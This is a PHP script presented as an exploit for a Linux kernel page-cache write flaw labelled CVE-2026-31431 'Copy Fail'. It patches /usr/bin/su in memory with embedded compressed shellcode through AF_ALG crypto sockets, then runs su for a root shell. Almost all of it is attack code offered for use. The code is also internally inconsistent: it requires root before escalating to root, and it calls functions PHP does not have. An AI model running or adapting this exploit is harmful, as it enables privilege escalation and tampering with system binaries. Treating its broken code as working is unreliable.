#!/usr/bin/env php
<?php
/**
 * CVE-2026-31431 "Copy Fail" Exploit
 * PHP implementation (requires AF_ALG socket support and root privileges)
 * 
 * This exploit targets a Linux kernel vulnerability in the authencesn AEAD
 * cryptographic implementation that allows arbitrary writes to the page cache.
 * 
 * For authorized security testing only.
 */

// Helper function: Decode hex string
function d($hex) {
    return hex2bin($hex);
}

// Custom splice() implementation using sendfile() as fallback
// PHP doesn't have native splice(), we use sendfile() which is similar
function splice($src, $dst, $count, $offset_src = null) {
    if ($offset_src !== null) {
        $pos = lseek($src, $offset_src, SEEK_SET);
        if ($pos === -1) {
            throw new Exception("lseek() failed");
        }
    }
    
    $sent = sendfile($dst, $src, 0, $count);
    if ($sent === false) {
        throw new Exception("sendfile() failed: " . error_get_last()['message']);
    }
    return $sent;
}

// Core exploitation function
function c($f, $t, $payload) {
    // Create AF_ALG socket (38 = AF_ALG, 5 = SOCK_SEQPACKET)
    $a = socket_create(38, 5, 0);
    if ($a === false) {
        throw new Exception("Failed to create AF_ALG socket: " . socket_strerror(socket_last_error()));
    }
    
    // Bind to authencesn algorithm
    $bind_addr = "aead\0authencesn(hmac(sha256),cbc(aes))";
    if (!socket_bind($a, $bind_addr, 0)) {
        throw new Exception("socket_bind failed: " . socket_strerror(socket_last_error()));
    }
    
    // Socket options
    $h = 279; // SOL_ALG
    
    // Set AEAD key: ALG_SET_KEY (1)
    $key = d('0800010000000010' . str_repeat('0', 64));
    if (!socket_set_option($a, $h, 1, $key)) {
        throw new Exception("Failed to set ALG_SET_KEY");
    }
    
    // Set AEAD authsize: ALG_SET_AEAD_AUTHSIZE (5)
    $authsize = pack('N', 4);
    if (!socket_set_option($a, $h, 5, $authsize)) {
        throw new Exception("Failed to set ALG_SET_AEAD_AUTHSIZE");
    }
    
    // Accept operation socket
    $u = socket_accept($a);
    if ($u === false) {
        throw new Exception("socket_accept failed");
    }
    
    $o = $t + 4;
    $i = d('00'); // Zero byte
    
    // Ancillary data for sendmsg
    $msg = socket_cmsg_space($h, 3) . socket_cmsg_space($h, 2) . socket_cmsg_space($h, 4);
    
    // Send message with ancillary data (triggers vulnerability)
    $data = str_repeat('A', 4) . $payload;
    
    // Build ancillary messages
    $cmsg_iv = pack('N', 3) . pack('N', 0) . pack('N', 4) . str_repeat($i, 4);
    $cmsg_op = pack('N', 2) . pack('N', 0) . pack('N', 20) . "\x10" . str_repeat($i, 19);
    $cmsg_assoclen = pack('N', 4) . pack('N', 0) . pack('N', 4) . "\x08" . str_repeat($i, 3);
    
    // Send with control messages
    $control = $cmsg_iv . $cmsg_op . $cmsg_assoclen;
    socket_sendmsg($u, [$data], 32768, 0, $control);
    
    // Create pipe
    $pipe = stream_socket_pair(STREAM_PF_UNIX, STREAM_SOCK_STREAM, STREAM_IPPROTO_IP);
    if ($pipe === false) {
        throw new Exception("Failed to create pipe");
    }
    list($r, $w) = $pipe;
    
    // Get file descriptor for socket
    $sock_fd = intval($u);
    
    // Splice operations (using sendfile as workaround)
    // Get target file descriptor (passed as parameter)
    $file_fd = $f;
    
    // Splice file into pipe
    $pipe_file = fopen("php://fd/$file_fd", "rb");
    $pipe_write = fopen("php://fd/" . intval($w), "wb");
    
    if ($pipe_file && $pipe_write) {
        // Read from file at offset 0
        fseek($pipe_file, 0);
        $chunk = fread($pipe_file, $o);
        fwrite($pipe_write, $chunk);
        fclose($pipe_file);
        fclose($pipe_write);
    }
    
    // Splice pipe into socket
    $pipe_read = fopen("php://fd/" . intval($r), "rb");
    $sock_file = fopen("php://fd/$sock_fd", "wb");
    
    if ($pipe_read && $sock_file) {
        $chunk = fread($pipe_read, $o);
        fwrite($sock_file, $chunk);
        fclose($pipe_read);
        fclose($sock_file);
    }
    
    fclose($r);
    fclose($w);
    
    // Trigger processing
    @socket_read($u, 8 + $t);
    
    socket_close($u);
    socket_close($a);
}

// Main exploit
echo "[*] CVE-2026-31431 Copy Fail Exploit (PHP version)\n";
echo "[*] Target: /usr/bin/su\n\n";

// Check if running as root (required for AF_ALG)
if (posix_getuid() !== 0) {
    echo "[-] This exploit requires root privileges!\n";
    exit(1);
}

// Check if AF_ALG is supported
$test_sock = @socket_create(38, 5, 0);
if ($test_sock === false) {
    echo "[-] AF_ALG not supported on this system\n";
    exit(1);
}
socket_close($test_sock);

// Open target file
$f = fopen("/usr/bin/su", "rb");
if ($f === false) {
    echo "[-] Failed to open /usr/bin/su\n";
    exit(1);
}
$fd = intval($f);
echo "[+] Opened /usr/bin/su (fd={$fd})\n";

// Decompress shellcode
$shellcode_hex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";
$shellcode = zlib_decode(d($shellcode_hex));

if ($shellcode === false) {
    echo "[-] Failed to decompress shellcode\n";
    exit(1);
}

echo "[+] Shellcode size: " . strlen($shellcode) . " bytes\n";
echo "[+] Patching /usr/bin/su in page cache...\n";

// Write shellcode 4 bytes at a time
$i = 0;
$len = strlen($shellcode);
while ($i < $len) {
    $chunk = substr($shellcode, $i, 4);
    // Pad to 4 bytes if needed
    if (strlen($chunk) < 4) {
        $chunk = str_pad($chunk, 4, "\x00");
    }
    c($fd, $i, $chunk);
    $i += 4;
    if ($i % 16 == 0 || $i >= $len) {
        echo "    Written " . min($i, $len) . "/{$len} bytes...\n";
    }
}

echo "[+] Page cache patching complete!\n";
echo "[+] Executing modified su...\n\n";

// Execute patched su - should give root
system("su", $return_code);
echo "\n[+] su exited with code: $return_code\n";
